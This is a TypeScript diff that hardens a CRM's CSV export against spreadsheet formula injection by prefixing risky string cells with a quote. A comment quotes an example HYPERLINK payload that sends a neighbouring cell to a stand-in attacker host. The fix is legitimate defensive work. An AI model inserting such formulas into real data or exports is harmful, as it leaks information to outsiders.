@@ -9,17 +9,30 @@ export interface CsvColumn<T> {
 /** UTF-8 byte-order mark (U+FEFF) so Excel opens the file with the right encoding. */
 const BOM = String.fromCharCode(0xfeff);
 
-function escapeCell(v: string | number | null | undefined): string {
+/**
+ * One CSV cell. Every export goes through this, so all of them are safe to open
+ * in a spreadsheet.
+ *
+ * A spreadsheet runs a cell that starts with = + - or @ as a formula, and a
+ * leading tab or carriage return can hide that start. Names, emails and notes
+ * reach the CRM from public forms and webhooks, so a "name" such as
+ * =HYPERLINK("https://evil.example/?d="&B2,"Open") became a live link that sent
+ * the next cell to a stranger when a colleague opened the export. A leading
+ * quote makes the spreadsheet show it as text. Only strings get it: a real
+ * number, -5 say, stays a number.
+ */
+export function csvCell(v: string | number | boolean | null | undefined): string {
   if (v == null) return '';
-  const s = String(v);
-  // Quote when the value contains a comma, quote, or newline; double inner quotes.
+  let s = String(v);
+  if (typeof v === 'string' && /^[=+\-@\t\r]/.test(s)) s = `'${s}`;
+  // Quote when the value contains a comma, quote, or line break; double inner quotes.
   if (/[",\n\r]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
   return s;
 }
 
 export function toCsv<T>(rows: T[], columns: CsvColumn<T>[]): string {
-  const head = columns.map((c) => escapeCell(c.header)).join(',');
-  const body = rows.map((r) => columns.map((c) => escapeCell(c.value(r))).join(',')).join('\n');
+  const head = columns.map((c) => csvCell(c.header)).join(',');
+  const body = rows.map((r) => columns.map((c) => csvCell(c.value(r))).join(',')).join('\n');
   return `${head}\n${body}`;
 }
 
